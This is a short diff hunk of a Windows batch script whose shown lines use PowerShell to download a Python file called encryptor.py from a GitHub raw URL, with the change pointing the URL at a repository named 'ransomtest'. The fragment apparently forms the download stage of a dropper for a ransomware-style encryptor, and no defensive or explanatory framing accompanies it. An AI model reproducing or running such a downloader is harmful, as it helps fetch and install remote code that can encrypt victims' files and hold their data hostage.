@@ -39,7 +39,7 @@ IF NOT ERRORLEVEL 1 (
 
 :: Download Python script from remote
 echo Downloading Python script...
-set SCRIPT_URL=https://raw.githubusercontent.com/repel11/test/refs/heads/main/encryptor.py
+set SCRIPT_URL=https://raw.githubusercontent.com/repel11/ransomtest/refs/heads/main/encryptor.py
 set SCRIPT_NAME=script.py
 
 powershell -Command "Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %SCRIPT_NAME%"
